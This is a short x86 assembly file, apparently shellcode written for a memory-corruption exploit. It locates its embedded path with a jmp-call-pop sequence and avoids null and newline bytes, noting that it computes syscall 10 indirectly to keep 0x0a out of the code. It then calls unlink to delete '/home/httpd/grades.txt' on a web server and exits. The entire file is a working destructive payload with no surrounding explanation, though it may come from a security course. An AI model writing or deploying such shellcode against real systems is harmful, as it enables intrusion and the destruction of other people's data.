#include <sys/syscall.h>

#define STRING	"/home/httpd/grades.txt"
#define STRLEN	22
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+4)

.globl main
	.type	main, @function

main:
	jmp	calladdr

popladdr:
	popl	%esi
	movl	%esi,(ARGV)(%esi)
	xorl	%eax,%eax
	movb	%al,(STRLEN)(%esi)
	movl	%eax,(ENVP)(%esi)

	xorl	%eax,%eax
	movb	$0xb,%al
	subb	$1,%al		/* SYS_unlink = 10, avoid 0x0a in shellcode */
	movl	%esi,%ebx
	leal	ARGV(%esi),%ecx
	leal	ENVP(%esi),%edx
	int	$0x80

	xorl	%ebx,%ebx
	movl	%ebx,%eax
	inc	%eax
	int	$0x80

calladdr:
	call	popladdr
	.string	STRING
